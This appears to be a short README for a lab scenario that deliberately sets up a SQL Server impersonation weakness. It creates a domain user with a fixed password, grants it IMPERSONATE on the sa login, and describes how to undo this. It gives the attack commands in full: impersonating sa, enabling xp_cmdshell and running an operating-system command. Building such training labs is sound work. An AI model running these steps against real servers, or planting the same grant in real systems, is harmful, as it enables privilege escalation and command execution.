# mssql-impersonate-login

Creates domain user `scn-sql-imp` (password `Aa1234567890!`), a Windows login for it on the target SQL Server, and `GRANT IMPERSONATE ON LOGIN::[sa]`.

Attack:

    mssqlclient.py -windows-auth <domain>/scn-sql-imp:'Aa1234567890!'@<host ip>
    SQL> exec_as_login sa
    SQL> enable_xp_cmdshell
    SQL> xp_cmdshell whoami

How to verify:

    SELECT g.name, t.name FROM sys.server_permissions p JOIN sys.server_principals g ON p.grantee_principal_id = g.principal_id JOIN sys.server_principals t ON p.major_id = t.principal_id WHERE p.permission_name = 'IMPERSONATE'

Disable gives databases owned by the login back to `sa`, closes its sessions, drops the login (the grant goes with it) and resets `xp_cmdshell` and `show advanced options` to `0` (Base values), and deletes the domain user.
